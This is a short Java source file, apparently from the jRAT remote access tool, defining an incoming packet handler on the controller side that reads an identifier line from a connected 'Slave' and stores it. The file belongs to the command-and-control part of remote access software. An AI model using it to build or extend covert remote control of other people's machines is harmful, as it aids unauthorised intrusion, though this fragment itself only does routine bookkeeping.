package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet7InitServerID extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		slave.setID(slave.readLine());
	}
}
